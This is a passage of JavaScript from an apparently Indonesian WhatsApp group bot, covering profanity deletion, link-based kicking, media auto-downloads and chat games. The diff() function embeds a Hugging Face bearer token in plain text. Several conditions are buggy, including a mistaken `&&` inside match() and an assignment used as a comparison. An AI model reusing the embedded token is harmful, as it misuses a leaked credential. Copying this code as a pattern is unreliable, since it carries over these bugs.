  newReply(`${toxicdel}`)
}
if (budy.match('goblok') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('peler') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('penis') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
// if (budy.match('asu') && (m.isGroup)) {
//   newReply(`${warntoxic}`)
//   if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
//   await sleep(1000)
//   await juna.sendMessage(m.chat, { delete: m.key })
//   newReply(`${toxicdel}`)
// }
if (budy.match('babi') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('dongo') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('kanjut') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('pepek') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('pepeq') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('memeq') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
// dengan kapital
if (budy.match('Kontol') && (m.isGroup)) {
  newReply('Kata Toxic terdeteksi,Pesan Akan Di Hapus')
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Kntl') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Memek') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Anjenk') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Bangsat') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Tolol') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Goblok') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Peler') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Penis') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Asu') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Babi') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Dongo') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Kanjut') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Pepek') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Pepeq') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('Memeq') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('jancok') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}if (budy.match('Jancok') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('anjing') && (m.isGroup)) {
  await newReply(`${warntoxic}`)
  if (isAdmins) return newReply('Gajadi kamu admin')
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('unc') && (m.isGroup)) {
  await newReply(`Share uncheck terdeteksi pesan akan dihapus`)
  if (isAdmins) return newReply('Gajadi kamu admin')
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  await newReply('Pesan telah dihapus')
}
if (budy.match('UNC') && (m.isGroup)) {
  await newReply(`Share uncheck terdeteksi pesan akan dihapus`)
  if (isAdmins) return newReply('Gajadi kamu admin')
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  await newReply('Pesan telah dihapus')
}
if (budy.match('Unc') && (m.isGroup)) {
  await newReply(`Share uncheck terdeteksi pesan akan dihapus`)
  if (isAdmins) return newReply('Gajadi kamu admin')
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  await newReply('Pesan telah dihapus')
}
if (budy.match('entot') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('entod') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}



















if (isAntiLink2) {
if (budy.match(`tiktok.com`)) {
newReply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
if (isAdmins) return newReply(`Gajadi, kamu admin`)
if (isCreator) return newReply(`Gajadi, kamu owner ku`)
await juna.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
// AutoDl
if (m.isGroup && !m.key.fromMe && (isAutoDlGc) && !isCmd) {
try {
if (budy.match(`instagram.com`)) {
newReply(`*「 LINK INSTAGRAM TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`)
let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/instagram-video?url=${budy}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, { video: { url: anu.result.url}, caption: `Done Sayang >///<`}, {quoted: m})
} else if (budy.match(`tiktok.com`)) {
newReply(`*「 LINK TIKTOK TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`)
let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/tiktok?apikey=${setting.BotKey}&url=${budy}`)
juna.sendMessage(m.chat, { video: { url: anu.result.nowm}, caption: `Done Sayang >///<`}, {quoted: m})
} else if (budy.match(`facebook.com`)) {
newReply(`*「 LINK FACEBOOK TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`)
let anu = await fetchJson(`https://api.arifzyn.xyz/download/facebook?url=${budy}`)
juna.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Done Sayang >///<`}, {quoted: m})
} else if (budy.match(`youtube.com|youtu.be`)) {
newReply(`*「 LINK YOUTUBE TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`)
let anu = await fetchJson(`https://api.arifzyn.xyz/download/youtube?url=${budy}`)
let audnya = await fetchJson(`https://api.arifzyn.xyz/download/ytmp3?url=${budy}`)
const aud = audnya.result.result
const cpt = anu.result.channel
const nick = anu.result.title
juna.sendMessage(m.chat, { video: { url: anu.result.mp4.data}, caption: `💬Judul : ${nick}\n👤Channel : ${cpt}`}, {quoted: m})
juna.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg'}, {quoted:m})
} 
} catch (err) {
//console.log(err);
newReply("Emmm anu om, error hehe:v")
//newReply(JSON.stringify(err));
}
}
// Kick Me
if (isKickMe) {
if (budy.match(`in kel`)) {
await newReply(`Siap Laksanakan`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
if (isAdmins) return newReply(`Kenapa Mau Out Sayang🥺`)
if (isCreator) return newReply(`Kenapa Mau Out Sayang🥺`)
newReply(`Done Awokwok`) 
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
// Mute
if (m.isGroup && isMute) {
if (!isAdmins && !isCreator) return
}
// Anti Wame
if (isAntiWame) {
if (budy.match(`wa.me` && `Wa.me`)) {
newReply(`*「 WA ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
await juna.sendMessage(m.chat, { delete: m.key })
if (isAdmins) return newReply(`Gajadi, Kamu admin`)
if (isCreator) return newReply(`Gajadi, Kamu ownerku`)
await juna.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (m.isGroup && isAntiWame2 && !isCreator && !isAdmins && isBotAdmins){
if (budy.match(`wa.me`)){
if (!isBotAdmins) return //newReply(`Untung bot bukan admin`)
await juna.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: juna.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, juna.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
juna.ev.emit('messages.upsert', msg)
}
async function newReply(teks) {
      const nedd = {
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            showAdAttribution: true,
            title: ucapanWaktu,
            body: `${pushname}`,
            previewType: "PHOTO",
            thumbnailUrl: pathimg, 
            sourceUrl: instagram, 
          },
        },
        text: teks,
      };
      return juna.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }
async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}
async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	})
}
async function loading () {
var nedd = [
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
]
let { key } = await juna.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...'})

for (let i = 0; i < nedd.length; i++) {
/*await delay(10)*/
await juna.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
const junaa = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// newReply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
newReply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await juna.sendText(room.x, str, m, { mentions: parseMention(str) } )
await juna.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}
// casino acc
if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'n') {
juna.sendMessage(m.chat, { text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
await addBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
await addBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}
}
}
if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'n') {
juna.sendMessage(m.chat, { text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
await addBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
await addBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}
}
}
// nikah acc
// acc nikah
if (fs.existsSync(`./database/nikah/${m.chat}.json`)) {
  var nikah = setNikah(`${m.chat}`)
  // casinoo.Z = m.sender.replace("@s.whatsapp.net", "") pelamar
  // casinoo.Y = users yang dilamar
  if (m.sender == `${nikah.yangdilamaar}` && budy.toLowerCase() == 'n') {
  juna.sendMessage(m.chat, { text: `「 Nikah Ditolak!!!! 」\n\n• @${nikah.yangdilamaar.split("@")[0]} menolak untuk dinikahi!`, mentions: [nikah.yangdilamaar] }, {quoted: m })
  }
  if (m.sender == `${nikah.yangdilamaar}` && budy.toLowerCase() == 'y') {
    nikahalert = `@${nikah.pelamar} telah resmi menikah dengan @${nikah.yangdilamaar.split('@')[0]},semoga langgeng ya ^_^ `
    juna.sendMessage(m.chat, { text: nikahalert, mentions: [nikah.pelamar + "@s.whatsapp.net", nikah.yangdilamaar]}, {quoted: m })
    deleteNikah(m.chat)
  }
  }
//game
const JwbTrue = (tebak, exp) => {
return`🎮 ${tebak} 🎮\n\nJawaban Benar 🎉\n+$${exp} balance`
}
const waktuHabis = (jawaban) => {
return `Waktu Habis\nJawaban: ${jawaban}`
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]][0]
 hadiah = kuismath[m.sender.split('@')[0]][1]
 if (budy.toLowerCase() == jawaban) {
juna.sendButtonText(m.chat, [{
buttonId: '.math medium',
buttonText: {
displayText: 'Kuis Math'
},
type: 1
}], ` 🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\n+$${hadiah} Balance` + `\n\nKirim perintah .math untuk bermain lagi 🎮`, footxt, m)
await addBalance(m.sender, hadiah, balance)
delete kuismath[m.sender.split('@')[0]]
 } else newReply("❌ Jawaban salah")
}
if (('family100' + m.chat in _family100) && !isCmd) {
 kuis = true
let room = _family100['family100' + m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
 if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
 }
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
 juna.sendTextWithMentions(m.chat, caption, m)
.then(mes => {
return _family100['family100' + m.chat].pesan = mesg
}).catch(_ => _)
 if (isWin || isSurender) delete _family100['family100' + m.chat]
}
if (tebakgame[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgame[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakgame[m.chat][2], balance) 
await newReply(JwbTrue("Tebak Bendera", tebakgame[m.chat][2]) + `\n\nKirim perintah .tebakgame untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tegem untuk bantuan dan .ytegem untuk menyerah 🎮`, footxt, '.tegem', 'Hint', '.ytegem', 'Nyerah', m)
 }
}
if (tebakgambar[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakgambar[m.chat][2], balance)
await newReply(JwbTrue("Tebak Gambar", tebakgambar[m.chat][2]) + `\n\nKirim perintah .tebakgambar untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tega untuk bantuan dan .ytega untuk menyerah 🎮`, footxt, '.tega', 'Hint', '.ytega', 'Nyerah', m)
 }
}
if (tebakkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkata[m.chat][2], balance)
await newReply(JwbTrue("Tebak Kata", tebakkata[m.chat][2]) + `\n\nKirim perintah .tebakkata untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebakkata[m.chat][3])
